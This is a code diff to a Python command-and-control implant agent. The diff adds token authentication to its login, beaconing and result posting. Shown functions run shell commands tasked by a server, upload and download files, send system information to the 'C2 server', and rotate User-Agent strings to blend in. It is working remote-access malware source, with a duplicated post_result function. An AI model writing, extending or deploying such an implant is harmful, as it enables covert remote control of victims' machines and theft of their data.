@@ -1,4 +1,7 @@
 import time
+import requests
+import importlib.util
+import sys
 import random
 import subprocess
 import json
@@ -23,6 +26,7 @@ SLEEP_MIN = 5
 SLEEP_MAX = 10
 
 AGENT_ID = "2"
+TOKEN = ""
 
 
 USER_AGENTS = [
@@ -55,6 +59,8 @@ def get_system_info():
 
 
 def login():
+    global TOKEN
+
     payload = {
         "username": username,
         "password": password,
@@ -68,21 +74,32 @@ def login():
             timeout=10
         )
 
-        if response.status_code == 200:
-            data = response.json()
-            if data.get("status") == "agent_logged_in":
-                return True
+
+        if response.status_code != 200:
+            return False
+
+        data = response.json()
+
+
+        if data.get("status") == "ok":
+            TOKEN = data.get("token")
+
+            if not TOKEN:
+                return False
+            return True
 
         return False
 
-    except Exception:
+    except Exception as e:
+        print("Login exception:", e)
         return False
+
 
 
 
 def beacon():
 
-    headers = {"USER-AGENT": random.choice(USER_AGENTS)}
+    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     payload = get_system_info()
 
@@ -165,18 +182,16 @@ def execute_shell(command, task_uuid):
         post_result(e.output.decode(), task_uuid)
 
 
-import requests
-import importlib.util
-import sys
-
 def post_result(output, task_uuid):
     """
     Sends task output back to C2 server
     """
     import json, requests
+    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
     data = json.dumps({"uuid": task_uuid, "output": output})
     # Replace with your encryption if used
-    requests.post("http://localhost:5000/result", json={"data": data})
+
+    requests.post("http://localhost:5000/result", json={"data": data},headers=headers)
 
 def download_file(url, save_as=None, task_uuid=None):
     try:
@@ -215,8 +230,7 @@ def download_file(url, save_as=None, task_uuid=None):
 
 
 def upload_file(path_to_file, task_uuid):
-
-    headers = {"USER-AGENT": random.choice(USER_AGENTS)}
+    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     try:
 
@@ -246,8 +260,7 @@ def upload_file(path_to_file, task_uuid):
 
 
 def post_result(result, task_uuid):
-
-    headers = {"USER-AGENT": random.choice(USER_AGENTS)}
+    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     payload = {
         "id": AGENT_ID,
